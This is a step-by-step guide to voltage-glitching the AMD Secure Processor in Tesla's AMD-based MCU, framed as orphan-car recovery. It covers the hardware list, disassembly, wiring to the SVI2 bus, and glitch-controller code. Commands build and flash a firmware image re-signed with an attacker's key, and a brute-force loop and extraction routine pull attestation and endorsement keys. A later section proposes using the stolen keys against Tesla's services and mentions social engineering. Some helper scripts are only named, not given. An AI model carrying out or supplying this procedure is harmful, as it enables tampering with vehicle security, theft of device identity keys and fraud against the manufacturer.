# AMD Ryzen Voltage Glitching Attack for Tesla MCU

**Document Version:** 1.0  
**Date:** 2026-02-03  
**Classification:** Technical Research Documentation  
**Purpose:** Orphan vehicle certificate recovery

---

## ⚠️ Critical Warnings

- **Bricking Risk:** Voltage glitching can permanently damage the MCU if parameters are incorrect
- **Irreversible:** No guaranteed recovery method exists for failed attempts
- **Hardware Access Required:** Requires physical disassembly and soldering
- **Legal Considerations:** Only for legitimately owned vehicles (orphan car recovery, not theft)
- **Not Patchable:** This is a hardware vulnerability that cannot be fixed via software updates

---

## 1. Theory & Background

### 1.1 AMD Secure Processor (AMD-SP) Architecture

Tesla MCU3 (MCU-Z) uses an AMD Ryzen Embedded processor (Zen 1 architecture). The AMD Secure Processor (AMD-SP, formerly PSP) serves as the **root of trust** for the system:

- ARM Cortex-A5 core embedded in the CPU
- Executes its own firmware before main CPU boots
- Validates boot chain via signature verification
- Controls TPM functionality (fTPM)
- Manages secure boot keys

### 1.2 Voltage Fault Injection Principle

Voltage glitching exploits transistor switching behavior:

1. **Normal Operation:** CPU operates at rated voltage (e.g., 1.0V-1.5V for core)
2. **Glitch:** Briefly drop voltage below operating threshold (~200-400mV drop)
3. **Effect:** Causes bit flips in CPU operations due to transistor switching failures
4. **Target:** Signature verification comparison instruction

```
Normal: if (signature == expected) → PASS
Glitched: if (signature == expected) → PASS (comparison skipped/corrupted)
```

### 1.3 Attack Chain Overview

```
┌──────────────────────────────────────────────────────────────────┐
│  1. Prepare modified SPI flash image with custom public key      │
│     └─ Replace AMD-SP public key with attacker's key             │
├──────────────────────────────────────────────────────────────────┤
│  2. Modify PSP_FW_BOOT_LOADER with payload                       │
│     └─ Re-sign with attacker's private key                       │
├──────────────────────────────────────────────────────────────────┤
│  3. Flash modified image to target SPI flash                     │
├──────────────────────────────────────────────────────────────────┤
│  4. Execute voltage glitch during public key validation          │
│     └─ Target: ROM bootloader hash comparison                    │
├──────────────────────────────────────────────────────────────────┤
│  5. Boot with custom payload → extract secrets                   │
│     └─ Obtain attestation keys, certificates, etc.               │
└──────────────────────────────────────────────────────────────────┘
```

### 1.4 Relevant Research Papers

| Paper | Authors | Venue | Year |
|-------|---------|-------|------|
| "One Glitch to Rule Them All" | TU Berlin (Buhren et al.) | ACM CCS | 2021 |
| "faulTPM: Exposing AMD fTPMs' Deepest Secrets" | TU Berlin | USENIX Security | 2023 |
| "Jailbreaking an Electric Vehicle in 2023" | TU Berlin (Werling et al.) | Black Hat USA | 2023 |
| "VoltPillager" | U Birmingham | USENIX Security | 2021 |

**Key Sources:**
- Paper: https://arxiv.org/abs/2108.04575
- Code: https://github.com/PSPReverse/amd-sp-glitch
- Presentation: https://i.blackhat.com/BH-US-23/Presentations/US-23-Werling-Jailbreaking-Teslas.pdf

---

## 2. Hardware Shopping List

### 2.1 Minimum Setup (~$100-150) - TU Berlin Method

| Item | Model | Price (USD) | Source | Notes |
|------|-------|-------------|--------|-------|
| **Glitch Controller** | Teensy 4.0 | ~$25 | PJRC.com | 600MHz ARM Cortex-M7, essential |
| **Logic Analyzer** | Saleae Logic 8 clone | ~$15-50 | AliExpress/Amazon | For timing analysis |
| **SPI Flash Programmer** | CH341A | ~$8 | Amazon/AliExpress | For BIOS flash read/write |
| **Soldering Equipment** | Station + tips | ~$30-80 | Amazon | Fine pitch capability needed |
| **Wire/Probes** | Dupont wires, test hooks | ~$15 | Amazon | For connections |
| **Power Supply** | Bench PSU (0-30V, 5A) | ~$40 | Amazon | Optional but recommended |

**Total Minimum: ~$100-150**

### 2.2 Advanced Setup (~$600-800) - ChipWhisperer Method

| Item | Model | Price (USD) | Source | Notes |
|------|-------|-------------|--------|-------|
| **ChipWhisperer-Husky** | NAE-CWHUSKY | ~$630 | Crowd Supply/NewAE | All-in-one glitching platform |
| **Starter Kit (alternative)** | CW-Husky Starter | ~$549 | Crowd Supply | Includes targets for practice |
| **SPI Flash Programmer** | EM100Pro (optional) | ~$500 | Dediprog | Professional grade emulator |
| **Oscilloscope** | 100MHz+ DSO | ~$200-400 | Various | For debug/timing verification |

**Total Advanced: ~$600-1500**

### 2.3 Parts Specifications

#### Teensy 4.0 (Primary Glitch Controller)
- **MCU:** NXP iMXRT1062, ARM Cortex-M7 @ 600MHz
- **I/O:** 40 digital pins, 3.3V logic
- **Features:** Fast GPIO for precise timing
- **Documentation:** https://www.pjrc.com/store/teensy40.html

#### ChipWhisperer-Husky (Alternative)
- **ADC:** 200 MS/s, 12-bit
- **Glitch Generation:** Sub-nanosecond resolution
- **Features:** Built-in logic analyzer, synchronous sampling
- **Documentation:** https://rtfm.newae.com/Capture/ChipWhisperer-Husky/

---

## 3. Tesla MCU Disassembly Guide

### 3.1 MCU Generations

| Generation | Processor | Vehicles | Attack Applicability |
|------------|-----------|----------|---------------------|
| MCU1 | Nvidia Tegra | Model S/X pre-2018 | Different attack (eMMC) |
| MCU2 | Intel Atom | Model S/X 2018-2021 | Vulnerable to other attacks |
| MCU3 (MCU-Z) | AMD Ryzen | Model 3/Y, S/X 2021+ | **TARGET** - Voltage glitching |

### 3.2 Physical Access Steps

#### Step 1: Disconnect Battery
```
⚡ CRITICAL: Disconnect 12V battery before any work
- Location: Front trunk (frunk), passenger side
- Wait 5 minutes after disconnection
```

#### Step 2: Remove Screen Assembly
```
1. Remove dashboard trim panels (clips, no screws)
2. Remove speaker grille (if applicable)
3. Locate 4x T20 Torx screws holding screen
4. Carefully disconnect:
   - Main data connector
   - Power connector
   - LVDS/display cable
5. Remove screen assembly from dash
```

#### Step 3: Access MCU Board
```
1. Place screen face-down on soft surface
2. Remove rear cover screws (multiple T10 Torx)
3. Separate cover from housing
4. MCU board is bonded to screen - careful!
5. Identify key components:
   - AMD Ryzen SoC (large BGA package)
   - SPI flash chip (8-pin SOIC)
   - Power delivery section
```

### 3.3 Key Components Location

```
┌─────────────────────────────────────────────┐
│           Tesla MCU-Z Board Layout          │
├─────────────────────────────────────────────┤
│                                             │
│  ┌─────────────┐                           │
│  │   LTE/WiFi  │    ┌─────────┐            │
│  │   Module    │    │   RAM   │            │
│  └─────────────┘    └─────────┘            │
│                                             │
│  ┌───────────────────────────────┐         │
│  │                               │         │
│  │        AMD Ryzen SoC          │ ◄─ Target│
│  │       (Zen 1 Embedded)        │         │
│  │                               │         │
│  └───────────────────────────────┘         │
│                                             │
│  ┌───────┐  ┌───────┐  ┌──────────────┐   │
│  │  SPI  │  │ Power │  │ Connectors   │   │
│  │ Flash │  │ Rails │  └──────────────┘   │
│  └───────┘  └───────┘                      │
│      ▲          ▲                          │
│   Backup    SVI2 Bus                       │
│   /Modify   Injection                      │
└─────────────────────────────────────────────┘
```

---

## 4. PCB Analysis & Injection Points

### 4.1 SVI2 Bus (Serial VID Interface 2.0)

The AMD SVI2 bus is a **power management interface** between the CPU and Voltage Regulator Modules (VRMs). It allows:
- Real-time voltage adjustment
- Power state transitions
- **ATTACK VECTOR:** Injecting rogue voltage commands

**SVI2 Bus Signals:**
- SVC (Serial VID Clock)
- SVD (Serial VID Data)
- SVT (Serial VID Telemetry)

### 4.2 Attack Connection Points

```
┌─────────────────────────────────────────────────────────────┐
│                  CONNECTION DIAGRAM                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Teensy 4.0                      Target MCU-Z               │
│  ──────────                      ──────────────             │
│                                                             │
│  GPIO Pin ─────────────────────► SVI2 SVC (Clock)          │
│  GPIO Pin ─────────────────────► SVI2 SVD (Data)           │
│  GPIO Pin ─────────────────────► Reset Line                │
│  SPI MOSI ─────────────────────► SPI Flash MOSI            │
│  SPI MISO ◄────────────────────  SPI Flash MISO            │
│  SPI CLK ──────────────────────► SPI Flash CLK             │
│  GPIO Pin ─────────────────────► SPI Flash CS              │
│  GND ─────────────────────────── GND                        │
│                                                             │
│  Logic Analyzer                                             │
│  ──────────────                                             │
│  CH0 ◄──────────────────────────  SVC                       │
│  CH1 ◄──────────────────────────  SVD                       │
│  CH2 ◄──────────────────────────  SPI CLK                   │
│  CH3 ◄──────────────────────────  CPU Power Rail            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4.3 Identifying SVI2 Bus on PCB

1. Locate VRM section near CPU
2. Find the voltage controller IC (often IR35217, ISL69147, or similar)
3. Trace signals from controller to CPU
4. SVI2 lines are typically:
   - Close together (3 signal lines)
   - Near VRM controller
   - May have test points nearby

### 4.4 SPI Flash Pinout

Standard 8-SOIC SPI Flash (Winbond, Macronix, etc.):

```
        ┌───────────┐
   CS  ─┤1        8├─ VCC (3.3V)
   DO  ─┤2        7├─ HOLD/RESET
   WP  ─┤3        6├─ CLK
  GND  ─┤4        5├─ DI
        └───────────┘
```

---

## 5. ChipWhisperer/Teensy Setup & Configuration

### 5.1 Teensy 4.0 Setup (TU Berlin Method)

#### Firmware Installation

```bash
# Clone the attack repository
git clone https://github.com/PSPReverse/amd-sp-glitch.git
cd amd-sp-glitch/attack-code

# Patch Arduino/Teensy headers (required)
patch -lu $(ARDUINO_PATH)/hardware/teensy/avr/cores/teensy4/imxrt.h <<EOF
--- imxrt.h
+++ imxrt.h
@@ -6445,11 +6445,10 @@ volatile uint32_t SAMR;
[patch content...]
EOF

# Compile and flash to Teensy 4.0
arduino --upload glitch_controller.ino
```

#### Host Control Script

```python
#!/usr/bin/env python3
"""
AMD-SP Glitch Controller
Based on TU Berlin research
"""

import serial
import time
import struct

class GlitchController:
    def __init__(self, port='/dev/ttyACM0', baud=115200):
        self.ser = serial.Serial(port, baud, timeout=1)
        
    def set_parameters(self, delay_ns, width_ns, voltage_offset):
        """
        Configure glitch parameters
        - delay_ns: Time from trigger to glitch (nanoseconds)
        - width_ns: Glitch pulse width (nanoseconds)
        - voltage_offset: Voltage drop amount (mV)
        """
        cmd = struct.pack('<III', delay_ns, width_ns, voltage_offset)
        self.ser.write(b'P' + cmd)
        
    def arm(self):
        """Arm the glitcher"""
        self.ser.write(b'A')
        
    def trigger(self):
        """Manual trigger"""
        self.ser.write(b'T')
        
    def reset_target(self):
        """Reset target device"""
        self.ser.write(b'R')
```

### 5.2 ChipWhisperer-Husky Setup

```python
#!/usr/bin/env python3
"""
ChipWhisperer-Husky Glitch Configuration
For AMD Ryzen voltage glitching
"""

import chipwhisperer as cw

# Connect to Husky
scope = cw.scope()

# Configure clock
scope.clock.clkgen_freq = 100e6  # 100 MHz
scope.clock.adc_src = "clkgen_x4"

# Configure glitch module
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"

# Glitch parameters (MUST BE TUNED)
scope.glitch.width = 10       # Glitch width (% of clock period)
scope.glitch.offset = 0       # Offset from trigger
scope.glitch.repeat = 1       # Number of glitches
scope.glitch.ext_offset = 0   # External trigger offset

# Enable glitch output
scope.io.glitch_lp = True
scope.io.glitch_hp = False

# Arm the glitch
scope.arm()
```

---

## 6. Attack Execution Steps

### 6.1 Phase 1: Preparation

#### Step 1: Backup Original BIOS
```bash
# Using CH341A programmer
flashrom -p ch341a_spi -r original_bios.bin

# Verify backup
md5sum original_bios.bin > original_bios.md5
```

#### Step 2: Analyze BIOS Structure
```bash
# Use PSPTool to analyze AMD firmware
pip install psptool
psptool original_bios.bin

# Identify key components:
# - PSP_FW_BOOT_LOADER
# - Public key entries
# - Boot loader version
```

#### Step 3: Generate Attack Keys
```bash
# Generate attacker's key pair
openssl ecparam -name secp384r1 -genkey -noout -out attacker_key.pem
openssl ec -in attacker_key.pem -pubout -out attacker_pub.pem
```

#### Step 4: Prepare Modified BIOS Image
```bash
# Replace AMD public key with attacker's key
# Modify PSP_FW_BOOT_LOADER with payload
# Re-sign components with attacker's key

python3 prepare_payload.py \
    --input original_bios.bin \
    --output modified_bios.bin \
    --key attacker_key.pem \
    --payload dump_secrets.bin
```

### 6.2 Phase 2: Hardware Setup

```
1. Remove MCU from vehicle (Section 3)
2. Connect SPI programmer to flash chip
3. Connect Teensy/ChipWhisperer to SVI2 bus
4. Connect logic analyzer for monitoring
5. Connect reset line to Teensy
6. Verify all connections with multimeter
7. Power MCU externally (12V, ensure stable supply)
```

### 6.3 Phase 3: Parameter Calibration

**Critical:** Glitch parameters must be precisely calibrated.

```python
# Parameter sweep for calibration
delays_ns = range(5000, 50000, 100)    # 5-50 microseconds
widths_ns = range(10, 100, 5)          # 10-100 nanoseconds
voltage_drops_mv = range(200, 400, 10) # 200-400 mV drop

for delay in delays_ns:
    for width in widths_ns:
        for voltage in voltage_drops_mv:
            # Set parameters
            controller.set_parameters(delay, width, voltage)
            
            # Flash modified BIOS
            flash_bios(modified_bios)
            
            # Arm and trigger
            controller.arm()
            controller.reset_target()
            
            # Check result
            result = check_boot_status()
            if result == "GLITCH_SUCCESS":
                print(f"Success: delay={delay}, width={width}, voltage={voltage}")
                break
```

### 6.4 Phase 4: Execute Attack

```bash
# Main attack loop
#!/bin/bash

ATTEMPTS=0
MAX_ATTEMPTS=10000

while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do
    # Reset target
    ./glitch_control reset
    
    # Arm glitcher
    ./glitch_control arm
    
    # Wait for glitch window
    sleep 0.1
    
    # Trigger boot
    ./glitch_control trigger
    
    # Check for successful payload execution
    if ./check_payload_output.py; then
        echo "SUCCESS after $ATTEMPTS attempts!"
        ./extract_secrets.py
        break
    fi
    
    ATTEMPTS=$((ATTEMPTS + 1))
    echo "Attempt $ATTEMPTS failed, retrying..."
done
```

### 6.5 Phase 5: Extract Secrets

Upon successful glitch, the payload executes and can:

1. **Dump ROM Bootloader** - For analysis
2. **Extract fTPM Secrets** - Key derivation material
3. **Dump SRAM Contents** - VCEK secrets present
4. **Extract IKEK** - For firmware decryption

```python
# Secret extraction after successful glitch
def extract_tesla_secrets():
    """
    Extract Tesla-specific secrets from glitched MCU
    """
    
    # Read secrets from SPI bus (payload writes here)
    secrets = read_spi_exfiltration()
    
    # Parse chip endorsement key
    cek = parse_cek(secrets['secret_fuses'])
    
    # Parse VCEK derivation material
    vcek_seed = parse_vcek_seed(secrets['sram_dump'])
    
    # Derive actual VCEK
    vcek = derive_vcek(vcek_seed, bl_version=255)
    
    # Extract Tesla attestation key
    attestation_key = extract_attestation_key(vcek)
    
    return {
        'cek': cek,
        'vcek': vcek,
        'attestation_key': attestation_key
    }
```

---

## 7. Success Indicators

### 7.1 Glitch Success Signs

| Indicator | Description |
|-----------|-------------|
| **Payload Output** | Data appears on SPI bus / UART |
| **Boot Progression** | System boots past signature check |
| **Memory Access** | Can dump protected memory regions |
| **No Crash** | System remains stable after glitch |

### 7.2 Failure Modes

| Failure | Symptom | Action |
|---------|---------|--------|
| **No Effect** | Normal boot | Adjust timing/voltage |
| **Crash/Reset** | Immediate reboot | Reduce voltage drop |
| **Hang** | No response | Adjust width, check connections |
| **Corruption** | Garbled output | Fine-tune parameters |
| **Permanent Damage** | Won't boot at all | **BRICK - Recovery needed** |

### 7.3 Expected Success Rate

- **Initial calibration:** Many attempts required (hundreds to thousands)
- **After calibration:** ~1-5% success rate per attempt
- **TU Berlin reported:** Success within reasonable attempt count
- **Time estimate:** Hours to days for first success

---

## 8. Recovery from Failed Attempts

### 8.1 Normal Recovery

If MCU still boots to some state:

```bash
# Restore original BIOS
flashrom -p ch341a_spi -w original_bios.bin

# Verify restoration
flashrom -p ch341a_spi -v original_bios.bin
```

### 8.2 Brick Recovery Methods

#### Method A: SPI Flash Replacement
1. Desolder damaged SPI flash
2. Program new flash chip with backup image
3. Solder new chip

#### Method B: In-System Programming
1. Remove power to MCU
2. Connect programmer directly to SPI chip
3. Force flash even if system won't boot

#### Method C: MCU Replacement (Last Resort)
- Obtain replacement MCU unit
- Transfer necessary configuration
- May require Tesla service for pairing

### 8.3 Prevention Tips

1. **Always keep backup** of original BIOS
2. **Start conservative** - low voltage drop, short width
3. **Monitor power** - use oscilloscope
4. **Test incrementally** - small parameter changes
5. **Document everything** - log all attempts and parameters

---

## 9. Post-Exploitation: Certificate Replacement

### 9.1 Understanding Tesla Certificates

Tesla vehicles use several cryptographic keys/certificates:

| Certificate | Purpose | Storage |
|-------------|---------|---------|
| **Vehicle Identity** | Identifies car to Tesla network | fTPM/HSM |
| **Attestation Key** | Proves hardware authenticity | AMD-SP secrets |
| **TLS Certs** | Secure communication | File system |
| **Owner Certs** | User authentication | Various |

### 9.2 Orphan Car Recovery Process

**THEORETICAL - NOT FULLY DOCUMENTED**

For an orphan vehicle (legitimately owned but locked out):

1. **Extract Attestation Key** - Using voltage glitch attack
2. **Generate New Vehicle Identity** - May require understanding Tesla's PKI
3. **Re-register with Tesla** - Theoretical, may require social engineering
4. **Alternative:** Use extracted key to authenticate with Tesla services

### 9.3 What Works vs. What's Theoretical

| Capability | Status | Evidence |
|------------|--------|----------|
| Extract hardware keys | ✅ CONFIRMED | TU Berlin research |
| Unlock software features | ✅ CONFIRMED | Cold Weather, Acceleration |
| Full Self-Driving unlock | ❌ NOT CONFIRMED | Gateway validation required |
| Network re-authentication | ⚠️ THEORETICAL | Not publicly demonstrated |
| Certificate replacement | ⚠️ THEORETICAL | PKI understanding needed |

---

## 10. References & Resources

### 10.1 Primary Sources

1. **"One Glitch to Rule Them All"** - Original AMD-SP glitching research
   - Paper: https://arxiv.org/abs/2108.04575
   - Code: https://github.com/PSPReverse/amd-sp-glitch
   - Video: https://www.youtube.com/watch?v=gwdlvLyPpZM

2. **"Jailbreaking an Electric Vehicle in 2023"** - Tesla-specific application
   - Black Hat: https://www.blackhat.com/us-23/briefings/schedule/index.html#jailbreaking-an-electric-vehicle-in--or-what-it-means-to-hotwire-teslas-x-based-seat-heater-33049
   - Slides: https://i.blackhat.com/BH-US-23/Presentations/US-23-Werling-Jailbreaking-Teslas.pdf

3. **"faulTPM: Exposing AMD fTPMs' Deepest Secrets"**
   - AMD Security Bulletin: https://www.amd.com/en/resources/product-security/bulletin/amd-sb-4005.html

### 10.2 Tools & Software

- **PSPTool:** https://github.com/PSPReverse/PSPTool
- **ChipWhisperer:** https://github.com/newaetech/chipwhisperer
- **Flashrom:** https://flashrom.org/

### 10.3 Hardware Vendors

- **Teensy:** https://www.pjrc.com/store/teensy40.html (~$25)
- **ChipWhisperer-Husky:** https://www.crowdsupply.com/newae/chipwhisperer-husky (~$630)
- **Logic Analyzers:** Saleae, clones on AliExpress

### 10.4 Community Resources

- **Tesla Motors Club Forums:** https://teslamotorsclub.com/
- **Unofficial Tesla Tech Wiki:** https://unofficial-tesla-tech.com/
- **lewurm's Tesla Research:** https://github.com/lewurm/blog/issues

---

## Appendix A: Glossary

| Term | Definition |
|------|------------|
| **AMD-SP** | AMD Secure Processor (formerly PSP) |
| **ASP** | AMD Secure Processor |
| **CEK** | Chip Endorsement Key |
| **fTPM** | Firmware TPM (implemented in AMD-SP) |
| **MCU-Z** | Tesla's AMD Ryzen-based Media Control Unit |
| **PSP** | Platform Security Processor (old name for AMD-SP) |
| **SVI2** | Serial VID Interface 2.0 (AMD power management) |
| **VCEK** | Versioned Chip Endorsement Key |
| **VRM** | Voltage Regulator Module |

---

## Appendix B: Legal Disclaimer

This document is provided for **educational and research purposes only**. The techniques described should only be used on:

- Vehicles you legally own
- Systems you have explicit authorization to test
- Research/academic purposes with proper ethical approval

**Unauthorized access to computer systems is illegal.** The authors do not condone or encourage:
- Vehicle theft
- Fraud against Tesla or other companies
- Circumvention of legitimate security measures for illegal purposes

If you have an orphan vehicle, consider:
1. Contacting Tesla directly
2. Consulting with automotive attorneys
3. Using authorized third-party services

---

## Appendix C: Hardware Photos & Schematics

This appendix provides visual references for the voltage glitching attack setup. All sources are publicly available.

### C.1 Primary Source: Black Hat 2023 Presentation

The definitive source for attack setup images is the TU Berlin presentation slides:

| Resource | Description | URL |
|----------|-------------|-----|
| **Black Hat PDF** | Official presentation with MCU photos, glitch diagrams, boot chain illustrations | https://i.blackhat.com/BH-US-23/Presentations/US-23-Werling-Jailbreaking-Teslas.pdf |
| **VicOne Analysis** | High-quality images adapted from Black Hat presentation | https://vicone.com/blog/tesla-jailbreak-unlocks-features-via-firmware-patching-and-voltage-glitching |

**Key Figures in Black Hat Presentation:**
- Figure 1: Tesla IVI booting process (SPI Flash vs NVMe locations)
- Figure 2: ROM boot loader in AMD-SP (cannot be patched)
- Figure 3: Voltage glitch timing diagram (target comparison bypass)
- Figure 4: Voltage glitch waveform showing drop/recovery

### C.2 faulTPM / AMD Voltage Glitch Hardware Setup

**GitHub Repository with Attack Code and Setup Diagram:**
- https://github.com/PSPReverse/amd-sp-glitch

**Hardware Connection Diagram (from README.md):**
```
┌─────────────────┐
│ Attacker PC     │
├─────────────────┤
│   │             │
│   ├──→ EM100 Flash Emulator ──→ SPI Flash Header
│   │
│   ├──→ Teensy 4.0 ──┬──→ Reset Button Header
│   │                 ├──→ SPI Flash (sniff)
│   │                 └──→ SVI2 Bus (glitch injection)
│   │
│   ├──→ Logic Analyzer ──┬──→ Teensy (trigger)
│   │                     ├──→ SVI2 Bus (monitor)
│   │                     ├──→ SPI Bus (monitor)
│   │                     └──→ CPU Power Rails (monitor)
│   │
│   └──→ Serial Port (COM1) ──→ Target Debug Output
└─────────────────┘
```

**Tom's Hardware Photo:**
- URL: https://www.tomshardware.com/news/amd-tpm-hacked-faultpm
- Shows: Multiple connections to power supply, BIOS SPI chip, and SVI2 bus on Lenovo test system
- Relevance: Demonstrates actual glitch injection wiring on similar AMD platform

### C.3 Tesla MCU PCB Photos

**MCU2 (Intel Atom) - Detailed Photos:**
| Source | Description | URL |
|--------|-------------|-----|
| lewurm GitHub | MCU board overview, front/back close-ups | https://github.com/lewurm/blog/issues/3 |
| imgur album (front) | High-res MCU2 front PCB | https://imgur.com/a/I6FtxPq |
| imgur album (back) | High-res MCU2 back PCB | https://imgur.com/a/NPpcdeK |

**lewurm's MCU Observations:**
- Shows J1 CAN/POWER port pinout (confirmed by testing):
  ```
  Pin 1: Unknown    Pin 3: Unknown    Pin 5: V12      Pin 7: Unknown
  Pin 2: Unknown    Pin 4: GND        Pin 6: GND      Pin 8: CANLo2
  Pin 9: CANLo1     Pin 10: CANHi2    Pin 11: CANHi1  Pin 12: Unknown
  ```
- LTE module (LE940B6) location identified
- Intel SoC location marked
- SD card with HRL files (historical record logs)

**Note:** MCU2 uses Intel Atom (different from MCU3/MCU-Z with AMD Ryzen), but physical layout references are still valuable.

### C.4 ChipWhisperer Setup Examples

**NewAE Wiki Tutorials:**
| Tutorial | Description | URL |
|----------|-------------|-----|
| VCC Glitch Attacks (V4) | Voltage glitching parameters and hardware setup | http://wiki.newae.com/V4:Tutorial_A3_VCC_Glitch_Attacks |
| CW305 Crowbar Glitching | FPGA-based glitch injection with SMA cables | http://wiki.newae.com/Tutorial_CW305-4_Voltage_Glitching_with_Crowbars |
| Fault101 Tutorials | Complete fault injection course with photos | https://github.com/newaetech/chipwhisperer-tutorials |

**ChipWhisperer-Husky Product Page (with photos):**
- https://www.crowdsupply.com/newae/chipwhisperer-husky
- Shows: Complete glitching setup, cable connections, target boards

### C.5 SVI2 Interface Documentation

The SVI2 (Serial VID Interface 2.0) is the target for voltage manipulation:

**AMD Power Management Documentation:**
- SVI2 is a two-wire serial interface between CPU and voltage regulator
- Allows CPU to request voltage changes dynamically
- Attacker can inject commands to force voltage drop

**Signal Connections:**
```
SVI2 Bus Pinout:
┌───────────────────────┐
│ SVC (Serial VID Clock)│ → Teensy GPIO (output)
│ SVD (Serial VID Data) │ → Teensy GPIO (bidirectional)
│ SVT (Serial VID Tel)  │ → Teensy GPIO (optional, telemetry)
└───────────────────────┘
```

**Glitch Parameters (from research):**
- Target Voltage Drop: 200-400mV below nominal
- Glitch Duration: 50-200ns typical
- Timing Window: During signature comparison (~microseconds after reset)

### C.6 Teensy 4.0 Wiring Reference

**PJRC Official Pinout:**
- https://www.pjrc.com/teensy/pinout.html
- https://www.pjrc.com/teensy/techspecs.html

**Attack Firmware Repository:**
- https://github.com/PSPReverse/amd-sp-glitch/tree/main/attack-code
- Contains ready-to-use Teensy firmware for voltage glitching

**Typical Wiring for AMD SP Glitch:**
```
Teensy 4.0 Pin Assignments:
┌────────────────────────────────────────────┐
│ Pin 0-1:   Serial debug output             │
│ Pin 2:     Reset trigger to target         │
│ Pin 3-4:   SVI2 SVC/SVD injection          │
│ Pin 5:     SPI CLK sniff                   │
│ Pin 6:     Glitch trigger (to logic probe) │
│ GND:       Common ground with target       │
└────────────────────────────────────────────┘
```

### C.7 Image Download Commands

To download key reference images (where licenses permit):

```bash
# Create directory structure
mkdir -p /root/tesla/images/{mcu-teardown,glitch-setup,schematics,black-hat}

# Black Hat presentation PDF
wget -O /root/tesla/images/black-hat/US-23-Werling-Jailbreaking-Teslas.pdf \
  "https://i.blackhat.com/BH-US-23/Presentations/US-23-Werling-Jailbreaking-Teslas.pdf"

# Note: GitHub and imgur images require manual download due to rate limits
# Visit URLs directly and save images as needed
```

### C.8 Summary Table: Hardware Photo Sources

| Image Type | Source | Description | Relevance | Status |
|------------|--------|-------------|-----------|--------|
| MCU boot chain diagram | Black Hat PDF (p.1) | Shows SPI Flash vs NVMe layout | Identifies target boot stages | PUBLIC |
| ROM bootloader diagram | Black Hat PDF (p.2) | AMD-SP ROM cannot be patched | Explains why glitching needed | PUBLIC |
| Voltage glitch waveform | Black Hat PDF (p.3-4) | Target timing for comparison skip | Attack parameter reference | PUBLIC |
| faulTPM wiring photo | Tom's Hardware article | Lenovo motherboard with glitch wires | Real-world setup example | PUBLIC |
| MCU2 PCB front | lewurm/blog GitHub | Intel-based MCU board overview | Physical component reference | PUBLIC |
| MCU2 PCB back | lewurm/blog GitHub | Power/CAN connector pinout | J1 pinout confirmed | PUBLIC |
| ChipWhisperer setup | NewAE Wiki | Professional glitch platform | Alternative to Teensy | PUBLIC |
| Teensy 4.0 pinout | PJRC.com | Development board pinout | Wiring reference | PUBLIC |
| SVI2 bus timing | AMD datasheets | Power management protocol | Glitch injection target | NDA (partial public) |

### C.9 Notes on MCU3 (AMD Ryzen) Specific Images

**Limited Public MCU3 Teardowns:**
- Most public Tesla MCU teardowns are MCU1 (Tegra) or MCU2 (Intel Atom)
- MCU3 (AMD Ryzen) detailed PCB photos are less commonly available
- The TU Berlin researchers used development/salvage units

**Identifying MCU Version:**
| MCU | CPU | Introduced | Visual ID |
|-----|-----|------------|-----------|
| MCU1 | NVIDIA Tegra 3 | 2012 (Model S) | Smaller board, older connectors |
| MCU2 | Intel Atom | 2018 | Intel chip visible, larger heatsink |
| MCU3 | AMD Ryzen V1000 | 2021 (refresh S/X) | AMD branding, newer layout |
| MCU-Z | AMD Ryzen | 2022 (Model 3/Y) | Similar to MCU3 |

**Recommendation:** For MCU3/MCU-Z specific reference, contact TU Berlin researchers or check their supplementary materials.

---

*Document compiled from public research sources. Not affiliated with Tesla, AMD, or TU Berlin.*
